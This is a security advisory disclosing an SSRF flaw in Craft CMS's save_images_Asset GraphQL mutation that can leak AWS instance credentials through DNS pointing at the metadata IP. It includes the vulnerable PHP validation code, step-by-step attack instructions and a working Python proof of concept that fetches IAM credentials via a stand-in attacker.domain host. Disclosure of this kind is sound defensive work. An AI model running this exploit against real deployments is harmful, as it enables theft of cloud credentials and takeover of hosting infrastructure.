summary: "Craft CMS: save_images_Asset graphql mutation can be abused to exfiltrate AWS credentials\
  \ of underlying host\n### Summary\n\n- The save_images_Asset graphql mutation allows a user\
  \ to give a url of an image to download.  (Url must use a domain, not a raw IP.)\n- Attacker\
  \ sets up domain attacker.domain with an A record of something like 169.254.169.254 (special\
  \ AWS metadata IP)\n- Attacker invokes save_images_Asset with url: http://attacker.domain/latest/meta-data/iam/security-credentials\
  \ and filename \"foo.txt\"\n- Craft fetches sensitive information on attacker's behalf, and\
  \ makes it available for download at /assets/images/foo.txt\n- Normal checks to verify that\
  \ image is valid are bypassed because of .txt extension\n- Normal checks to verify that url\
  \ is not an IP address are bypassed because user provided a valid domain that resolves to\
  \ a sensitive internal IP address\n\n### Details\n\nhandleUpload() in src/gql/resolvers/mutations/Assets.php\
  \ contains the code that processes the save_images_Asset mutation.\n\nIt has some basic validation\
  \ logic for the url parameter (source of the image) and filename parameter (what to save image\
  \ as):\n\n```\n   } elseif (!empty($fileInformation['url'])) {\n            $url = $fileInformation['url'];\n\
  \n            // make sure the hostname is alphanumeric and not an IP address\n          \
  \  $hostname = parse_url($url, PHP_URL_HOST);\n            if (\n                !filter_var($hostname,\
  \ FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) ||\n                filter_var($hostname,\
  \ FILTER_VALIDATE_IP)\n            ) {\n                throw new UserError(\"$url contains\
  \ an invalid hostname.\");\n            }\n\n            if (empty($fileInformation['filename']))\
  \ {\n                $filename = AssetsHelper::prepareAssetName(pathinfo(UrlHelper::stripQueryString($url),\
  \ PATHINFO_BASENAME));\n            } else {\n                $filename = AssetsHelper::prepareAssetName($fileInformation['filename']);\n\
  \            }\n\n            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));\n\
  \            if (is_array($allowedExtensions) && !in_array($extension, $allowedExtensions,\
  \ true)) {\n                throw new AssetDisallowedExtensionException(Craft::t('app', \"\
  “{$extension}” is not an allowed file extension.\"));\n            }\n```\n\nThe upshot of\
  \ this validation is that url must contain a hostname, not an IP, and filename must contain\
  \ an allowed extension.  If the allowed extension is a typical image extension, further validation\
  \ will be done downstream  to verify that the downloaded content is in fact an image.\n\n\
  An authenticated attacker can trick this mutation into fetching sensitive AWS metadata, or\
  \ other sensitive information from the craft instance's internal network.\n\n- First, the\
  \ attacker must register a domain -- e.g. attacker.domain.  \n- Next, they must point their\
  \ domain at the sensitive internal ip they'd like to access (e.g. 169.254.169.254)\n- Next,\
  \ they make a request to save_images_Asset with url set to http://attacker.domain/sensitive/path\
  \ with filename set to \"something.txt\"\n- Finally the attacker makes a http request to retrieve\
  \ /assets/images/something.txt, which contains sensitive information\n\n\n### PoC\n\n####\
  \ Preconditions\n\n- Graphql access must be enabled\n- Attacker must have access to a graphql\
  \ token\n- Token must be configured to have access to save_images_Asset mutation\n- Attacker\
  \ must have configured a domain, \"attacker.domain\" pointing to the sensitive internal IP\
  \ address they'd like to access\n- .txt must be an allowed extension for uploads via save_images_Asset\
  \ (as it is by default)\n\n#### Code\n\n```\nimport requests\n\n# Replace GRAPHQL_ENDPOINT\
  \ and BEARER_TOKEN per target.\nGRAPHQL_ENDPOINT = 'http://localhost:8080/actions/graphql/api'\n\
  TOKEN = '<TOKEN HERE>'\n\nmutation = '''\nmutation SaveAsset($_file: FileInput!, $title: String,\
  \ $focalPoint: String) { save_images_Asset(_file: $_file,\n   title: $title, focalPoint: $focalPoint)\
  \ { id title url filename focalPoint dateCreated } }\n'''\n\nvariables = {\n  '_file': {\n\
  \    'url' : \"http://attacker.domain/latest/meta-data/iam/security-credentials\",\n    'filename':\
  \ 'foo.txt'\n\n  },\n  \"title\": \"my photo\",\n  \"focalPoint\": \"0.5;0.5\"\n\n}\n\nresp\
  \ = requests.post(GRAPHQL_ENDPOINT,\n                     json={'query': mutation, 'variables':\
  \ variables},\n                     headers={'Authorization': f'Bearer {TOKEN}'})\nprint(resp.status_code,\
  \ resp.text)\n```\n\nIf attack is successful, response to running this script will be something\
  \ like:\n\n```\n200 {\"data\":{\"save_images_Asset\":{\"id\":\"211403\",\"title\":\"my photo\"\
  ,\"url\":\"http://localhost:8080/assets/volumes/images/foo.txt\",\"filename\":\"foo.txt\"\
  ,\"focalPoint\":null,\"dateCreated\":\"2025-12-18T09:45:24-08:00\"}}}\n```\n\nAttacker can\
  \ then download sensitive data by fetching http://localhost:8080/assets/volumes/images/foo.txt\n\
  \n\n### Impact\n\nImpacted users must:\n\n- Have graphql enabled\n- Have a graphql token created\
  \ with permissions to use save_images_Asset\n- Have graphql token stolen by attacker or abused\
  \ by malicious insider\n\nImpact is heightened if:\n\n- craft is running on something like\
  \ an AWS EC2 instance, which has a well-known, sensitive internal http address that can be\
  \ accessed to fetch metadata.  \n\nUltimate result is:\n\nAttacker or malicious insider gets\
  \ access to infrastructure craft is running on, not just craft itself."
